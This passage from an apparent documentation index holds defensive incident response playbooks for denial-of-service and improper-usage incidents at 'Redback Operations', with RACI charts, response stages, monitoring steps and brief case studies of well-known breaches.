tactics\tA, R\tR\tI\tI\tI\tI Containment Isolate affected systems\tA, R\tR\tI\tI\tI\tI Implement access controls\tA, R\tR\tI\tI\tI\tI Block malicious activity\tA, R\tR\tI\tI\tI\tI Eradication Remove unauthorized access\tA, R\tR\tI\tI\tI\tI Patch vulnerable systems\tA, R\tR\tI\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI\tI Recovery Restore compromised systems\tA, R\tR\tI\tI\tI\tI Recover data from backups\tA, R\tR\tI\tI\tI\tI Reconfigure networks\tA, R\tR\tI\tI\tI\tI Post-Incident Review Assess incident response\tA, R\tR\tI\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI\tI Update incident response protocols\tA, R\tR\tI\tI\tI\tI  Key:  R: Responsible (Who does the work)A: Accountable (Ultimate ownership)C: Consulted (Provides input)I: Informed (Kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4 Flow Diagram​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#4-flow-diagram","content":"   Preparation (Pink) Develop and maintain Cyber Incident Response Plan (CIRP) for DoS incidents.Identify critical assets and prioritize them.Train incident response teams and employees. Detection (Orange) Continuously monitor network traffic.Set up alerts for suspicious patterns.Validate incidents. Analysis (Yellow) Investigate attack vectors and affected systems.Collaborate with relevant teams. Containment (Green) Implement immediate mitigation measures.Isolate affected systems.Communicate progress. Eradication (Blue) Identify vulnerabilities.Patch and remediate.Verify closure of attack vector. Recovery (Red) Gradually restore services.Validate restoration.Monitor for recurrence. Post-Incident Review (Brown) Conduct a thorough review.Learn from the incident.Update the CIRP.  ","version":"Next","tagName":"h2"},{"title":"5 Incident Response Stages​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#51-preparation","content":" Objective: Establish a robust foundation for effective incident response. Key Actions Risk Assessment: Use thorough risk assessments to find possible DoS vulnerabilities in systems, apps, and network infrastructure.Creating Cyber Incident Response Plan(CIRP): Make a thorough incident response plan for handling denial-of-service (DoS) incidents. Establish communication routes, escalation protocols, and roles and duties.Resource Allocation: Ensure that the people, equipment, and technologies required to support incident response activities are available.Training and Awareness: To improve staff members' comprehension of DoS risks, detection methods, and response protocols, offer training and awareness programmes.Form an Incident Response Team: Assign people to specific areas of handling the response to denial-of-service (DoS) situations in order to create a specialised team.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#52-detection","content":" Objective: Promptly identify and confirm the occurrence of DoS attacks. Key Actions Monitoring and Alerting: To identify indications of unusual behaviour suggestive of a denial-of-service attack, continuously monitor network traffic, system performance metrics, and security logs.Anomaly Detection: Use intrusion detection/prevention systems (IDS/IPS), network traffic analysis tools, and security information and event management (SIEM) systems to identify strange patterns or abrupt increases in traffic volume that could be signs of a denial-of-service assault.Alert Triage: Set alerts produced by monitoring systems in order of priority and look into them to see whether they point to a possible DoS assault. Correlate alerts with several data sources to validate them.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#53-analysis","content":" Objective: Conduct in-depth analysis of the DoS attack to understand its nature, scope, and impact. Key Actions Traffic Analysis: Examine network traffic patterns to determine the nature of the traffic, source IP addresses, and services or apps that are being targeted in order to determine the characteristics of the DoS attack.Log analysis: Look through firewall logs, system logs, and other pertinent log data to find any unusual activity or attempted illegal access that may have been connected to the DoS incident.Forensic Investigation: Gather and store digital evidence connected to the DoS assault for forensic examination. Memory dumps, system snapshots, and packet captures are a few examples of this.Root produce Analysis: Find the vulnerabilities or misconfigurations that the attacker may have exploited in order to trigger the denial of service (DoS) incident.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#54-containment","content":" Objective: Limit the impact of the attack and prevent its spread. Key Actions Traffic Filtering: To stop or filter malicious traffic linked to the DoS attack, use firewall rules, access control lists (ACLs), and other network filtering techniques.Rate limitation: To reduce excessive traffic flows and avoid network congestion, use rate limitation or traffic shaping techniques.Isolation: To stop the DoS attack from spreading and lessen its effects on other infrastructure components, isolate the compromised systems or network segments.Cloud-Based Mitigation: Use content delivery networks (CDNs) or cloud-based mitigation services to reduce the amount of DoS attack traffic before it enters the network perimeter of the company.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#55-eradication","content":" Objective: Eliminate the root cause of the attack and remove the presence of the attacker. Key Actions Patch and Update Deployment: To address vulnerabilities that the attacker exploited and stop future denial-of-service assaults, apply patches, security updates, and configuration modifications.System Hardening: To strengthen systems and lessen their vulnerability to DoS attacks, take additional security precautions. Some of them include turning off unused services, tightening access limits, and putting security best practices into practice.Network Redesign: To increase resilience and better withstand DoS assaults, think about revamping the network architecture or implementing more network security measures.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#56-recovery","content":" Objective: Restore normal operations. Key Actions System Restoration: Assure data integrity and uninterrupted operations by restoring impacted systems and services from backups.Service Verification: To make sure the restored systems and services are operating correctly and securely, thoroughly test and verify them.Communication with Stakeholders: Give advice on how to resume regular activities and update stakeholders on the status of the recovery efforts.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#57-post-incident-review","content":" Objective: Conduct a comprehensive review of the DoS incident response process to learn from the incident and improve future response. Key Actions Debriefing: Conduct a debriefing session with the members of the incident response team to evaluate the success of the response efforts and pinpoint any obstacles that may have arisen.Root Cause Analysis: To determine the underlying causes of the DoS occurrence, such as security control gaps or vulnerabilities, conduct a root cause analysis.Documentation of Lessons Learned: Provide a record of the takeaways that were discovered from the DoS incident, outlining effective response tactics, areas that require development, and suggestions for improving incident response capabilities.Updates to the Incident Response Plan: To resolve identified shortcomings and integrate improvements, update the incident response plan in light of the post-event review results.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Develop a comprehensive strategy specifically for monitoring DoS threats.  Key Actions:  Define clear objectives tailored to the detection and management of DoS threats.Select and deploy specialized tools designed to monitor DoS-related activities, such as advanced Intrusion Detection Systems (IDS), Security Information and Event Management (SIEM) systems, and Network Traffic Analysis tools.Establish baselines for normal network and system activity to differentiate between legitimate and suspicious behaviors.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Implement and configure monitoring tools to detect DoS threats across the organization’s infrastructure.  Key Actions:  Deploy chosen monitoring tools specifically configured to track DoS-related activities across all critical systems and networks.Integrate monitoring tools with threat intelligence feeds to stay updated on the latest DoS vulnerabilities and attack vectors.Ensure comprehensive logging of all network traffic and system activities, focusing on potential DoS attack patterns.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous surveillance and analysis to promptly detect and respond to DoS threats.  Key Actions:  Implement real-time monitoring to continuously observe network traffic, system performance, and security logs for signs of DoS attacks.Utilize behavioral analytics and machine learning to identify anomalies in network and system activity that could indicate DoS attempts.Correlate events from various sources to identify and prioritize potential DoS threats.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected DoS threats through a robust alerting system.  Key Actions:  Establish thresholds and triggers for different types of DoS alerts, considering the severity and potential impact.Configure automated alerts to notify the incident response team immediately when suspicious DoS activities are detected.Implement a prioritization system for alerts to ensure that critical DoS threats are addressed promptly.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified DoS threats.  Key Actions:  Perform initial triage to verify the validity and potential impact of DoS alerts.Conduct in-depth analysis of confirmed alerts to understand the root cause and potential extent of the threat.Initiate containment measures, such as isolating affected systems and blocking malicious traffic, and execute necessary eradication procedures.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response to DoS incidents and identify areas for improvement.  Key Actions:  Record all details of the DoS incident, including detection, analysis, and response actions taken.Conduct a comprehensive review of the monitoring and response processes post-incident to identify strengths and areas for improvement.Update monitoring tools, configurations, and thresholds based on findings to enhance future detection and response capabilities.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s strategy and tools for monitoring DoS threats.  Key Actions:  Conduct regular audits to ensure the effectiveness of DoS monitoring tools and strategies.Provide ongoing training to security personnel, focusing on detecting and responding to DoS threats.Continuously adapt the monitoring strategy to address emerging DoS threats and vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"7 Terminology​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#7-terminology","content":" CIRP (Cyber Incident Response Plan): It is a documented set of procedures and guidelines for organization to follow when responding to and managing security incidents. It outlines roles, responsibilities, communication channels, and technical steps necessary to detect, analyse, contain, eradicate, and recover from incidents. It is essential to have a well-prepared CIRP for effective incident response and minimizing the impact of security threats. CSIRT (Cyber Security Incident Response Team): It an expert group that handles cyber security incidents. They are responsible for detecting, analysing, containing, eradicating, and recovering from security incidents affecting an organization. CSIRTs play a critical role in safeguarding an organization’s assets and maintaining trust with stakeholders. UDP (User Datagram Protocol): It is a communication protocol used for time-sensitive transmissions such as video playback or DNS lookups. It does not establish a connection before data transfer and directly send them to a target computer without checking whether they arrived as intended or indicating their order. TCP three-way handshake: It is a protocol for establishing a connection between a server and a client in a TCP/IP network. It involves three steps: client sends a SYN segment to the server, server responds with a SYN-ACK segment, client acknowledges the server’s response with an ACK segment and establishing a reliable connection for data transfer. Denial of Service (DoS): An attempt to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services. Distributed Denial of Service (DDoS): A type of DoS attack where multiple compromised systems attack a target, causing a denial of service. Network Traffic Analysis: The process of intercepting and examining messages to deduce information from patterns in communication. ","version":"Next","tagName":"h2"},{"title":"Improper Usage Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#11-overview","content":" Redback Operations is at the forefront of innovation and technological improvement in the ever-changing field of cybersecurity. However, these innovations also bring with them new challenges, such as improper usage incidents. These occurrences encompass a broad spectrum of improper or unauthorized use of Redback's systems, data, or resources, posing serious risks to Redback's data security, operational continuity, and industry reputation. These risks can stem from employee errors resulting in accidental data exposure, insiders purposefully abusing their access privileges, or malicious actors coordinating sophisticated external attacks.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#12-purpose","content":" This incident response plan provides Redback Operations with a methodical and comprehensive way to address improper usage issues. The playbook seeks to enable Redback to react quickly and decisively to improper usage issues, minimizing their impact on data security, operational continuity, and the company's reputation by outlining clear principles, protocols, and best practices.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#13-attack-definition","content":" At Redback Operations, incidents involving improper usage can take many different forms, each with unique challenges and consequences. Insider threats involve staff members abusing their access rights for improper reasons, such as sabotage or personal gain. External attacks are planned by hostile organizations aiming to compromise systems, steal data, or interfere with business operations. These can include sophisticated hacks like malware infections, denial-of-service attacks, or hacking.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#14-scope","content":" This playbook covers all types of improper or unauthorized use of Redback Operations' resources, systems, or data. It offers instructions for handling different kinds of improper usage issues, whether they stem from internal negligence or malicious external intent. The playbook includes practical insights and tactics for managing risks, controlling incidents, and minimizing their impact on Redback's operations.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#21-insider-threat","content":" The security and integrity of Redback Operations' data are seriously threatened by insider threats. These threats entail members of the organisation abusing their access rights for improper intent, which may result in data breaches, sabotage, or the unlawful publication of private information. Insider risks might arise from disgruntled employees, careless behaviour, or unintentional activities. As such, they are challenging to identify and prevent in the absence of effective monitoring and reaction processes.  Case Study: Tesla Insider Sabotage (2020)  Overview: A disgruntled employee at Tesla attempted to sabotage the company's manufacturing systems by making unauthorized changes to the code of the manufacturing operating system.Impact: The incident could have disrupted Tesla's operations, but the attack was detected and contained before significant damage occurred.Response: Tesla conducted a thorough investigation, terminated the employee, and implemented additional security measures to prevent future insider threats.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attack​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#22-external-attack","content":" External assaults use a variety of strategies and techniques to infiltrate systems, steal data, or interfere with operations to target Redback Operations from outside the company. Cybercriminals, nation-state actors, or other hostile organisations may be the source of these assaults if they are attempting to take advantage of holes in Redback's networks, applications, or infrastructure. Advanced cyberattacks, such as phishing, malware infections, or denial-of-service assaults, are frequently used in external attacks with the intention of breaching Redback's defences and taking advantage of flaws for illicit financial gain or other goals.  Case Study: Equifax Data Breach (2017)  Overview: Attackers exploited a vulnerability in Equifax's web application framework to gain access to sensitive information.Impact: The breach exposed personal information of approximately 147 million individuals.Response: Equifax enhanced its cybersecurity practices, implemented stronger access controls, and paid a settlement of up to $700 million.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breaches​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#23-data-breaches","content":" The security and confidentiality of Redback Operations' data are seriously threatened by data breaches. These instances happen when private or sensitive data is obtained, revealed, or taken without permission, putting Redback at risk of loss of money, legal repercussions, and harm to its reputation. Internal threats, external attacks, and other weaknesses in Redback's systems or procedures can lead to data breaches, which emphasises the significance of strong data protection measures and incident response procedures in reducing the risks and repercussions of such incidents.  Case Study: Marriott Data Breach (2018)  Overview: Attackers gained unauthorized access to Marriott's Starwood guest reservation database.Impact: Personal information of approximately 500 million guests was exposed.Response: Marriott notified affected individuals, offered free identity theft monitoring, and enhanced its security measures.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Incidents​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#24-phishing-incidents","content":" Phishing attacks use phoney emails, messages, or websites to target Redback Operations' stakeholders and employees with the intention of tricking them into divulging private information, including login passwords or financial information. These assaults can be challenging to identify and stop without the right knowledge and training since they frequently pose as authentic messages from reliable sources. Phishing attacks have the potential to cause financial fraud, data breaches, or unauthorised access to Redback's systems, which emphasises the significance of preventative steps like email filtering and security awareness training in reducing the dangers associated with these occurrences.  Case Study: Google and Facebook Phishing Scam (2013-2015)  Overview: Attackers sent fraudulent invoices and other documents to employees at Google and Facebook, tricking them into wiring over $100 million to the attackers.Impact: Significant financial loss for both companies.Response: The companies cooperated with law enforcement to investigate the scam, recover funds, and implement stronger email security measures.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attacks​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#25-ransomware-attacks","content":" The data security and operational continuity of Redback Operations are seriously threatened by ransomware assaults. To encrypt data or prevent users from accessing computers, malicious software is deployed in these attacks. The attackers then demand a ransom to unlock the encrypted data or to get access back. Attacks using ransomware have the potential to cause data loss, financial extortion, and operational interruptions. This emphasises the significance of having strong backup and recovery procedures in place, as well as proactive steps to stop and lessen the effects of such situations.  Case Study: WannaCry Ransomware Attack (2017)  Overview: The WannaCry ransomware spread rapidly across the globe, encrypting data on infected systems and demanding ransom payments in Bitcoin.Impact: Over 200,000 computers in 150 countries were affected, causing significant disruptions to businesses and public services.Response: Organizations applied patches, restored systems from backups, and enhanced their cybersecurity practices to prevent future ransomware attacks.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#26-credential-theft","content":" One popular strategy used by attackers to obtain unauthorised access to Redback Operations' systems or networks is credential theft. Phishing attacks, social engineering, and other techniques could be used in these incidents to trick employees or stakeholders into giving over their login credentials or authentication tokens. It is crucial to have robust authentication procedures, user awareness, and monitoring in place to identify and lessen the risks associated with credential theft incidents because, with compromised credentials, attackers can evade authentication mechanisms, obtain privileged access to confidential data, or engage in unauthorised activities within Redback's infrastructure.  Case Study: Dropbox Data Breach (2012)  Overview: Attackers gained access to Dropbox user credentials, which were later leaked online.Impact: Approximately 68 million user accounts were compromised.Response: Dropbox prompted affected users to change their passwords, implemented two-factor authentication, and enhanced its security measures.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#3-stakeholders","content":" The proficient handling and settlement of incidents require the coordinated endeavours and cooperation of a heterogeneous group of stakeholders, each possessing distinct knowledge, viewpoints, and roles. The following parties are essential to the incident response process, from frontline responders entrusted with containment and mitigation to senior leadership tasked with making strategic decisions:  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#31-it-security-team","content":" Lead: Daniel McAulay (Senior Project Leader)  Responsibilities:  Leading technical efforts to identify, examine, and address improper usage incidents.Monitoring system and network logs, conducting forensic analysis, and implementing security controls to prevent future incidents.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#32-incident-response-team","content":" Lead: Devika Sivakumar (Blue Team Leader)  Responsibilities:  Coordinating response efforts and communicating with relevant parties.Implementing incident response protocols and conducting post-incident analysis.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#33-communication-team","content":" Lead: Kaleb Bowen (Company Lead)  Responsibilities:  Managing internal and external communications regarding the incident.Informing staff, clients, and other relevant parties about response activities.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#34-customers","content":" Responsibilities:  Reporting suspicious activity.Following organizational guidelines to protect personal information.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors and Partners​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#35-third-party-vendors-and-partners","content":" Responsibilities: • Providing specialized knowledge and assistance during the response process. • Complying with data security and privacy requirements.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart for Improper Usage Incident Response​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#raci-chart-for-improper-usage-incident-response","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tCustomers\tThird-Party VendorsPreparation Establish incident response team\tR, C\tA, R\tI\tI\tI Develop response procedures\tA, R\tR, C\tI\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI Analysis Collect forensic data\tA, R\tR\tI\tI\tI Identify attack methods\tA, R\tR\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI Containment Isolate compromised systems\tA, R\tR\tI\tI\tI Implement access restrictions\tA, R\tR\tI\tI\tI Block malicious traffic\tA, R\tR\tI\tI\tI Eradication Remove malicious software\tA, R\tR\tI\tI\tI Patch vulnerabilities\tA, R\tR\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI Recovery Restore backups\tA, R\tR\tI\tI\tI Rebuild systems\tA, R\tR\tI\tI\tI Conduct user training\tA, R\tR\tI\tI\tI Post-Incident Review Review incident response\tA, R\tR\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI Update response procedures\tA, R\tR\tI\tI\tI Communication Create communication plans\tC\tC\tA, R\tI\tI Draft communication materials\tC\tC\tA, R\tI\tI Manage media relations\tC\tC\tA, R\tI\tI Provide updates\tC\tC\tA, R\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4 Flow Diagram​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  This phase denotes the start of the process of becoming ready to handle situations of inappropriate usage. An incorrect usage occurrence is immediately reported to the incident response team. The colour yellow represents the preparation character of this phase, which focuses on gathering the staff and resources required to handle the situation successfully.  Identification (Identify): Red  Identifying the incorrect usage incidence and containing it quickly are part of the identification step. Actions are done to stop the problem from spreading further and isolate the compromised systems. The important and urgent nature of this stage is shown by the colour red, underscoring the significance of acting quickly to stop more harm.  Notification (Notif): Violet  Stakeholders are informed at this phase, and preliminary mitigating actions are put into place. We take steps like modifying login credentials and running scans to find any illegal activity or access. Malicious activity is also examined, and parties are notified so they may organise a response. The colour violet denotes the incident's notice and first reaction attempts, emphasising the need for quick action and communication to lessen its effects.  Containment (Contain): Sky Blue  At this point, the main goals are to control the situation and stop more harm or illegal entry. Should containment tactics prove effective, more escalation might not be required. But higher management could be alerted for more assistance or a solution if containment proves difficult. The containment attempts to stop the incident's spread and lessen its effects on operations are symbolised by the colour sky blue.  Eradication (Erad): Light Green  The goal of the Eradication step is to restore system integrity and eradicate the incident's underlying cause. Procedures are implemented to eliminate malware, illegal access, and other security risks. Details of the incident are recorded for review and analysis later. The activity of eliminating the event and guaranteeing the security of the organization's systems is symbolised by the light green colour.  Recovery (Recover): Brown  At this point, attempts are being made to get past the event and resume regular business. Recovery operations begin, which might involve patching hacked systems, recovering data from backups, and adding further protection. Continuous observation is carried out to identify any lingering risks or weaknesses. The recovery phase, which aims to reinforce security measures and restore business continuity, is symbolised by the colour brown.  Post-Incident Actions (Post): Light Pink  Conducting post-event activities to assess the response's efficacy and pinpoint areas in need of improvement is the last phase. In addition to doing a post-event evaluation to evaluate the organization's reaction and draw lessons from the occurrence, ongoing monitoring is carried out for instances of improper usage. The post-event efforts focused on introspection, education, and ongoing enhancement of incident response skills are represented by the light pink colour.  ","version":"Next","tagName":"h2"},{"title":"5 Incident Response Stages  ​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#51-preparation","content":" Objective: Establishing in place the guidelines, practices, and tools required to handle instances of inappropriate usage.Activities:Putting together a team for incident response with clear roles and duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Holding practice sessions and exercises on a regular basis to guarantee readiness and rehearse incident response protocols.Putting in place security measures and surveillance systems to find and stop instances of unauthorised usage.Outcome: A well-equipped company with the ability to react quickly and efficiently to instances of inappropriate use.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#52-detection","content":" Objective: Recognising warning signs of inappropriate use or illegal access to the systems and resources of the business.Activities:Keeping an eye out for questionable activity, such strange access patterns or illicit data transfers.Using security information and event management (SIEM) and intrusion detection systems (IDS) to find such problems.Separating malicious from genuine activity by analysing anomalies and alarms.Outcome: Rapid reaction and mitigation efforts are made possible by early identification of inappropriate usage situations.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#53-analysis","content":" Objective: Recognising the kind and extent of the incident involving improper usage.Activities:Gathering information and carrying out forensic investigation to Identify the extent and cause of the improper usage incidence.Examining hacked networks and systems to find attack vectors and how they affect compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs).Outcome: A comprehensive understanding of the improper usage incident, including its causes, effects, and attribution.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#54-containment","content":" Objective: Halting more illegal access or data leaks and lessening the effect and spread of the incident involving improper usage.Activities:Dividing up susceptible networks and systems to stop intruders from moving laterally.Putting safety measures and access restrictions in place to stop illegal access to sensitive data.Limiting or preventing harmful data, software, or network flow to stop more damage.Outcome: Efficient handling of the improper usage event, reducing harm to the company's information and infrastructure.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#55-eradication","content":" Objective: Eliminating threats and any lingering vulnerabilities from the company's networks and IT systems.Activities:Removing illegal software and data and returning hacked computers to a safe configuration.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security protocols and guidelines to fix flaws or vulnerabilities found.Outcome: Removal of all traces of the improper usage incident and reduction of vulnerabilities to prevent future occurrences.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Improper Usage Incident Response 